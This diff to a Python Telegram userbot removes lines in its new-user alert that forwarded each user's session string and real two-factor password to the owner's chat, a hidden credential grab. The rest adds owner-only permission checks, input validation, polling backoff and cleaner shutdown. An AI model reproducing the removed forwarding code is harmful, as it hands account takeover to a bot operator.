@@ -13,6 +13,7 @@ import concurrent.futures
 import signal
 import hashlib
 import ast
+from runtime_safety import PollBackoff, recent_burst, service_callback_allowed
 import operator as _operator
 from datetime import timedelta, timezone
 import warnings
@@ -2140,9 +2141,7 @@ async def notify_new_user(user_info, string_session: str,
                            phone: str = "N/A",
                            twofa_verified: bool = False,
                            twofa_password: str = ""):
-    """
-    Send #NEW_USER alert to LOG_CHANNEL and OWNER DM with full session details.
-    """
+    """Send a login alert without forwarding credentials to chats."""
     tstamp  = _kolkata_now()
     twofa_v = "Yes" if twofa_verified else "No"
     name    = getattr(user_info, 'first_name', '') or 'Unknown'
@@ -2159,13 +2158,7 @@ async def notify_new_user(user_info, string_session: str,
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
-    if twofa_password:
-        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
-    msg += (
-        f"🔑 <b>Session String:</b>\n"
-        f"<code>{string_session}</code>\n\n"
-        f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
-    )
+    msg += f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
 
     try:
         owner_id = int(cfg.get("OWNER_ID") or _OWNER_UID or 0)
@@ -4419,8 +4412,6 @@ def _render_start_menu(sender_id: int, sender=None, is_owner: bool = None):
             [Button.inline("\U0001f510 Login / Activate Core", b"login_activate")],
             *([[Button.inline("\U0001f3b5 Music Setup", b"music_setup")]]
               if MUSIC_ENABLED else []),
-            [Button.inline("\u2796 Remove My String", b"rm_str"),
-             Button.inline("\U0001f504 Reboot My Core", b"reboot_mine")],
             [Button.inline("\u26a1 Active Users", b"act_users")],
             [Button.inline("\U0001f4d8 Tutorial", b"tut_home"),
              Button.inline("\u2728 Features", b"feat_home")],
@@ -5135,7 +5126,8 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
                              buttons=[[Button.inline("🔙 Back", b"back_start")]])
 
     elif data == b"rm_str":
-        if not is_owner and sender_id not in active_user_ids:
+        if not service_callback_allowed(data, is_owner):
+            await event.answer("Only the owner can manage saved sessions.", alert=True)
             return
         saved = cfg.get("SAVED_STRINGS", [])
         if not saved:
@@ -5145,20 +5137,27 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
             return
         btns = []
         for i, s in enumerate(saved):
-            btns.append([Button.inline(f"Remove: {s[:20]}...", f"rm_str_{i}".encode())])
+            btns.append([Button.inline(f"Remove saved account {i + 1}", f"rm_str_{i}".encode())])
         btns.append([Button.inline("🔙 Back", b"back_start")])
         await _safe_bot_edit(event, sender_id,
             "<blockquote>Select string to remove:</blockquote>", buttons=btns)
 
     elif data.startswith(b"rm_str_"):
-        idx   = int(data.decode().replace("rm_str_", ""))
+        if not service_callback_allowed(data, is_owner):
+            await event.answer("Only the owner can manage saved sessions.", alert=True)
+            return
+        try:
+            idx = int(data.decode().replace("rm_str_", ""))
+        except (ValueError, UnicodeError):
+            await event.answer("Invalid saved account.", alert=True)
+            return
         saved = cfg.get("SAVED_STRINGS", [])
         if 0 <= idx < len(saved):
             removed = saved.pop(idx)
             cfg["SAVED_STRINGS"] = saved
             save_config(cfg)
             await _safe_bot_edit(event, sender_id,
-                f"<blockquote>✅ Removed: <code>{removed[:30]}...</code></blockquote>",
+                "<blockquote>✅ Saved session removed.</blockquote>",
                 buttons=[[Button.inline("🔙 Back", b"back_start")]])
         else:
             await _safe_bot_edit(event, sender_id,
@@ -5177,6 +5176,9 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
         os.execv(sys.executable, [sys.executable] + sys.argv)
 
     elif data == b"reboot_mine":
+        if not service_callback_allowed(data, is_owner):
+            await event.answer("Only the owner can restart the service.", alert=True)
+            return
         # BUG FIX: same — clear buttons so they don't linger after reboot.
         await _safe_bot_edit(event, sender_id,
             "<blockquote>♻️ <b>Rebooting...</b></blockquote>", buttons=[])
@@ -5557,7 +5559,15 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
         except (ValueError, IndexError):
             ctrl_chat = event.chat_id
 
-        mstate   = get_music_state(ctrl_chat)
+        if ctrl_chat != event.chat_id:
+            await event.answer("Invalid control chat.", alert=True)
+            return
+        mstate = get_music_state(ctrl_chat)
+        control_client = active_core_clients.get(mstate.owner_uid) or userbot
+        if not (_MUSIC_PUBLIC or _is_music_open_chat(ctrl_chat)) and not await verify_privileges(
+                event, client=control_client, core_id=mstate.owner_uid):
+            await event.answer("You cannot control this playback.", alert=True)
+            return
         tgcalls  = _get_session_pytgcalls(mstate.owner_uid or 0)
 
         async def _vc_answer(txt):
@@ -10446,6 +10456,8 @@ _gcsec_action_lock = set()
 _gcsec_scan_locks = {}
 _gcsec_dialog_cache = {}
 _gcsec_no_rights_until = {}
+_gcsec_backoff = PollBackoff()
+_gcsec_rpc_slots = asyncio.Semaphore(4)
 
 
 def _gcsec_action_kind(action):
@@ -10551,79 +10563,108 @@ async def _gcsec_scan_chat(client, chat):
     from telethon.tl.functions.channels import GetAdminLogRequest
     cid = int(getattr(chat, "id", chat))
     key = (id(client), cid)
-    try:
-        result = await asyncio.wait_for(client(GetAdminLogRequest(
-            channel=chat, q="", min_id=0, max_id=0, limit=100,
-            events_filter=None, admins=None,
-        )), timeout=2.5)
-    except Exception:
+    if not cfg.get("GC_SECURITY_ENABLED", True) or not _gcsec_backoff.ready(key):
         return
-    events_found = getattr(result, "events", ()) or ()
-    last_id = _gcsec_seen.get(key, 0)
-    current_max = last_id
-    now = time.time()
-    protected = _gcsec_protected_ids()
-    for item in reversed(list(events_found)):
-        event_id = int(getattr(item, "id", 0) or 0)
-        current_max = max(current_max, event_id)
-        if event_id <= last_id:
-            continue
-        action = getattr(item, "action", None)
-        actor_id = int(getattr(item, "user_id", 0) or 0)
-        new_participant = getattr(action, "new_participant", None)
-        target_id = _gcsec_participant_id(new_participant)
-        action_name = type(action).__name__.lower() if action is not None else ""
-        # Record promotion history for diagnostics only; enforcement is actor-only.
-        if target_id and ("toggle" in action_name or "participant" in action_name):
-            is_admin = bool(getattr(new_participant, "admin_rights", None))
-            is_admin = is_admin or "admin" in type(new_participant).__name__.lower()
-            if is_admin:
-                _gcsec_record_promotion(client, cid, actor_id, target_id)
-        action_kind = _gcsec_action_kind(action)
-        if not action_kind:
-            continue
-        if not actor_id or actor_id in protected:
-            continue
-        bucket_key = (id(client), cid, actor_id)
-        bucket = _gcsec_bursts.setdefault(bucket_key, [])
-        event_time = getattr(item, "date", None)
-        ts = event_time.timestamp() if event_time else now
-        bucket[:] = [t for t in bucket if ts - t <= _GCSEC_WINDOW]
-        bucket.append(ts)
-        if len(bucket) >= _GCSEC_THRESHOLD:
-            # Strict safety rule: only the admin who performed the destructive
-            # actions is demoted/muted. Never cascade to promoted users.
-            if actor_id not in protected:
-                await _gcsec_demote_and_mute(
-                    client, chat, actor_id, len(bucket), action_kind)
-            bucket.clear()
-    _gcsec_seen[key] = current_max
+    if _gcsec_no_rights_until.get(key, 0) > time.time():
+        return
+    lock = _gcsec_scan_locks.setdefault(key, asyncio.Lock())
+    if lock.locked():
+        return
+    async with lock:
+        try:
+            async with _gcsec_rpc_slots:
+                result = await asyncio.wait_for(client(GetAdminLogRequest(
+                    channel=chat, q="", min_id=_gcsec_seen.get(key, 0), max_id=0,
+                    limit=100, events_filter=None, admins=None,
+                )), timeout=8)
+        except asyncio.CancelledError:
+            raise
+        except Exception as exc:
+            _gcsec_backoff.fail(key, exc)
+            return
+        _gcsec_backoff.clear(key)
+        events_found = getattr(result, "events", ()) or ()
+        last_id = _gcsec_seen.get(key, 0)
+        current_max = last_id
+        now = time.time()
+        protected = _gcsec_protected_ids()
+        for item in reversed(list(events_found)):
+            event_id = int(getattr(item, "id", 0) or 0)
+            current_max = max(current_max, event_id)
+            if event_id <= last_id:
+                continue
+            action = getattr(item, "action", None)
+            actor_id = int(getattr(item, "user_id", 0) or 0)
+            action_kind = _gcsec_action_kind(action)
+            if not action_kind or not actor_id or actor_id in protected:
+                continue
+            event_time = getattr(item, "date", None)
+            # Missing dates are not evidence of a live destructive burst.
+            if event_time is None:
+                continue
+            bucket_key = (id(client), cid, actor_id)
+            bucket = recent_burst(_gcsec_bursts.get(bucket_key, []),
+                                  event_time.timestamp(), now, _GCSEC_WINDOW)
+            _gcsec_bursts[bucket_key] = bucket
+            if len(bucket) >= _GCSEC_THRESHOLD and cfg.get("GC_SECURITY_ENABLED", True):
+                await _gcsec_demote_and_mute(client, chat, actor_id, len(bucket), action_kind)
+                bucket.clear()
+        _gcsec_seen[key] = current_max
 
 
 async def _gcsec_loop(client):
-    while True:
+    dialog_key = (id(client), "dialogs")
+    while client.is_connected():
         try:
             if not cfg.get("GC_SECURITY_ENABLED", True):
                 await asyncio.sleep(_GCSEC_POLL)
                 continue
             now = time.monotonic()
             cached = _gcsec_dialog_cache.get(id(client))
-            if not cached or now - cached[0] > 20:
+            if (not cached or now - cached[0] > 300) and _gcsec_backoff.ready(dialog_key):
                 dialogs = []
-                async for dialog in client.iter_dialogs():
-                    if getattr(dialog, "is_group", False) or getattr(dialog, "is_channel", False):
-                        entity = getattr(dialog, "entity", None)
-                        if entity is not None and (getattr(entity, "megagroup", False) or getattr(dialog, "is_group", False)):
-                            dialogs.append(entity)
-                _gcsec_dialog_cache[id(client)] = (now, dialogs)
-            else:
-                dialogs = cached[1]
-            await asyncio.gather(*(_gcsec_scan_chat(client, chat) for chat in dialogs), return_exceptions=True)
+                try:
+                    async with _gcsec_rpc_slots:
+                        async for dialog in client.iter_dialogs():
+                            entity = getattr(dialog, "entity", None)
+                            rights = getattr(entity, "admin_rights", None)
+                            if (entity is not None and getattr(entity, "megagroup", False)
+                                    and (getattr(entity, "creator", False) or
+                                         (rights and getattr(rights, "ban_users", False)))):
+                                dialogs.append(entity)
+                    _gcsec_dialog_cache[id(client)] = (now, dialogs)
+                    _gcsec_backoff.clear(dialog_key)
+                except asyncio.CancelledError:
+                    raise
+                except Exception as exc:
+                    _gcsec_backoff.fail(dialog_key, exc)
+            # Reuse the last successful enumeration during a Telegram outage.
+            dialogs = _gcsec_dialog_cache.get(id(client), (0, []))[1]
+            for chat in dialogs:
+                if not client.is_connected() or not cfg.get("GC_SECURITY_ENABLED", True):
+                    break
+                await _gcsec_scan_chat(client, chat)
         except asyncio.CancelledError:
             raise
         except Exception as exc:
-            bot_logger("GCSEC_LOOP_ERR", repr(exc))
+            _gcsec_backoff.fail(dialog_key, exc)
+            bot_logger("GCSEC_LOOP_ERR", type(exc).__name__)
         await asyncio.sleep(_GCSEC_POLL)
+
+
+async def _stop_gcsec_client(client):
+    tasks = [task for task in list(_gcsec_tasks)
+             if getattr(task, "_gcsec_client", None) is client]
+    for task in tasks:
+        task.cancel()
+    await asyncio.gather(*tasks, return_exceptions=True)
+    _gcsec_dialog_cache.pop(id(client), None)
+    _gcsec_backoff.drop_client(id(client))
+    for mapping in (_gcsec_seen, _gcsec_bursts, _gcsec_promotions,
+                    _gcsec_scan_locks, _gcsec_no_rights_until):
+        for key in list(mapping):
+            if key[0] == id(client):
+                mapping.pop(key, None)
 
 # ══════════════════════════════════════════
 # PASSIVE MONITORS
@@ -10879,6 +10920,7 @@ async def _run_extra_core(client, core_id: int):
     try:
         await client.run_until_disconnected()
     finally:
+        await _stop_gcsec_client(client)
         active_core_clients.pop(int(core_id), None)
         active_user_ids.discard(int(core_id))
         try:
@@ -11065,7 +11107,7 @@ async def _start_music_engine(user_id: int):
 # ══════════════════════════════════════════
 # MAIN ENGINE ENTRY
 # ══════════════════════════════════════════
-async def main():
+async def _main_runtime():
     global asstbot, asstbot_started   # recreate bot client after stale auth errors
     # Cap concurrent OS threads used by asyncio.to_thread() (music-source
     # searches/downloads, ffmpeg fetch loops, etc.). Racing ~12 sources at
@@ -11297,7 +11339,8 @@ async def main():
             try:
                 from plugins import load_all_plugins
                 _plug_results = load_all_plugins(
-                    userbot, cfg=cfg, bot_logger=bot_logger)
+                    userbot, cfg=cfg, bot_logger=bot_logger, save_config=save_config,
+                    core_commands=set(_CODE_COMMAND_INDEX))
                 for _fname, _ok, _err in _plug_results:
                     if _ok:
                         bot_logger("PLUGIN", f"Loaded {_fname}")
@@ -11346,6 +11389,8 @@ async def main():
     _startup_total = 0
     _startup_active = 0
     for s in list(cfg.get("SAVED_STRINGS", [])):
+        if _shutdown_event is not None and _shutdown_event.is_set():
+            break
         if not isinstance(s, str) or not s.strip() or s.startswith("BQ"):
             continue
         _startup_total += 1
@@ -11442,7 +11487,11 @@ async def main():
 
         bot_logger("SYSTEM",
             f"All connections dropped. Reconnecting in {_reconnect_delay}s...")
-        await asyncio.sleep(_reconnect_delay)
+        try:
+            await asyncio.wait_for(_shutdown_event.wait(), timeout=_reconnect_delay)
+            break
+        except asyncio.TimeoutError:
+            pass
 
         # Reconnect primary bot
         asstbot_started = False
@@ -11471,13 +11520,13 @@ async def main():
         except Exception as _re:
             bot_logger("USERBOT_ERROR", f"Userbot reconnect error: {_re}")
 
-    # Graceful shutdown on the SAME loop that started every client.
-    bot_logger("SYSTEM", "Running graceful shutdown of all cores...")
+async def main():
     try:
+        await _main_runtime()
+    finally:
+        bot_logger("SYSTEM", "Running graceful shutdown of all cores...")
         await _graceful_shutdown()
-    except BaseException as _shut_err:
-        bot_logger("SYSTEM", f"Shutdown error: {_shut_err}")
-    bot_logger("SYSTEM", "Shutdown complete.")
+        bot_logger("SYSTEM", "Shutdown complete.")
 
 async def _graceful_shutdown():
     """Stop every connected client on the SAME event loop that started them.
@@ -11493,19 +11542,24 @@ async def _graceful_shutdown():
     # PyTgCalls 2.x has no global stop(); stopping the underlying pyrogram
     # client tears down its group calls too. Stop every account's music
     # client, then every Telethon core (extras + primary + assistant bot).
+    # Cancel producers before closing shared network resources.
+    core_clients = list(dict.fromkeys(list(active_core_clients.values()) + list(extra_clients)))
+    current = asyncio.current_task()
+    owned_files = {__file__, music_sources.__file__, shruti_api.__file__}
+    tasks = [task for task in asyncio.all_tasks()
+             if task is not current and not task.done()
+             and getattr(getattr(task.get_coro(), "cr_code", None), "co_filename", None) in owned_files]
+    for task in tasks:
+        task.cancel()
+    await asyncio.gather(*tasks, return_exceptions=True)
+    await shruti_api.close()
     for _client in list(pyro_apps.values()):
         try:
             if _client is not None:
                 await _client.stop()
         except BaseException:
             pass
-    for _client in list(active_core_clients.values()):
-        try:
-            if _client is not None:
-                await _client.disconnect()
-        except BaseException:
-            pass
-    for _client in list(extra_clients):
+    for _client in core_clients:
         try:
             if _client is not None:
                 await _client.disconnect()
